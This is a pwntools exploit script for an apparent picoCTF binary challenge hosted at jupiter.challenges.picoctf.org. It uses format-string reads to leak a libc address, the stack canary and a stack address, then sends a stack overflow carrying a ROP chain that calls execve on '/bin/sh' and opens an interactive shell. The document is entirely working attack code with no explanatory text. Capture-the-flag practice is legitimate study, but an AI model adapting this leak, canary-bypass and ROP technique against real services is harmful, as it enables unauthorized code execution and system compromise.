from pwn import *

if args.REMOTE:
    r = remote("jupiter.challenges.picoctf.org", 18263)
    ans = b'-3727'
elif args.LOCAL:
    # r = process("./V", env={"LD_PRELOAD" : "./libc-2.27.so"})
    r = process('./vuln')
    ans = b'-3615'
    # ans = b'-3727'
r.recvuntil(b'What number would you like to guess?\n')
r.sendline(ans)
r.sendline(b'%147$p')
r.recvuntil(b'Congrats: ')
a = r.recvline().strip()
success(a)
libc = int(a,16) - 0x018fa1
print(hex(libc))

r.sendline(ans)
r.sendline(b'%135$p')
r.recvuntil(b'Congrats: ')
a = r.recvline().strip()
canary = int(a,16)
print(hex(canary))

r.sendline(ans)

r.sendline(b'%138$p')
r.recvuntil(b'Congrats: ')
a = r.recvline().strip()
stack = int(a,16) - 556
print(hex(stack))

pop_ebx_ret = libc + 0x00018d05
pop_ecx_ret = libc + 0x00193aa4
pop_edx_ret = libc + 0x00001aae
pop_eax_ret = libc + 0x00024d37
syscall = libc + 0x00002d3f

rop = flat(
    pop_eax_ret, 0xb,
    pop_ebx_ret, stack,
    pop_ecx_ret, 0,
    pop_edx_ret, 0, 
    syscall
)
payload = b'/bin/sh\x00'.ljust(0x200,b'a') + p32(canary) + b'a' * 0xc + rop 
r.sendline(ans)
r.sendline(payload)

r.interactive()